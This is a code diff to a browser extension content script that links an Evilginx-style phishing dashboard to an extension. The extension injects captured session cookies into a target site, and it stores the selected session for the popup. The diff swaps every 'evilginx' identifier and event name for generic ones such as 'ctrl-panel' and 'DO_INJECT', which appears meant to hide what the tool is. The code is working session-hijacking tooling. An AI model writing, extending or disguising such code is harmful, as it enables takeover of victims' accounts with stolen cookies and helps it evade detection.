@@ -4,11 +4,11 @@
 // selection state for the extension popup.
 
 (function () {
-  if (!document.body || document.body.dataset.app !== 'evilginx-dashboard') return;
+  if (!document.body || document.body.dataset.app !== 'ctrl-panel') return;
 
   // Signal presence to the dashboard JS.
-  window.__evilginxExtension = true;
-  document.dispatchEvent(new CustomEvent('evilginx-extension-ready'));
+  window.__ctrlExtension = true;
+  document.dispatchEvent(new CustomEvent('ext-ready'));
 
   // Mark dashboard as reachable for the popup.
   chrome.storage.local.set({
@@ -25,7 +25,7 @@
     if (event.source !== window || !event.data) return;
 
     // Inject request from dashboard.
-    if (event.data.type === 'EVILGINX_INJECT') {
+    if (event.data.type === 'DO_INJECT') {
       var payload = event.data.payload;
       chrome.runtime.sendMessage(
         { action: 'inject', cookies: payload.cookies, targetUrl: payload.target_url },
@@ -41,13 +41,13 @@
             time:      Date.now()
           }});
           // Forward result back to dashboard page.
-          window.dispatchEvent(new CustomEvent('evilginx-inject-result', { detail: r }));
+          window.dispatchEvent(new CustomEvent('inject-result', { detail: r }));
         }
       );
     }
 
     // Session selected in dashboard — store for popup.
-    if (event.data.type === 'EVILGINX_SESSION_SELECT') {
+    if (event.data.type === 'SESSION_SELECT') {
       chrome.storage.local.set({ currentSession: event.data.payload });
     }
   });
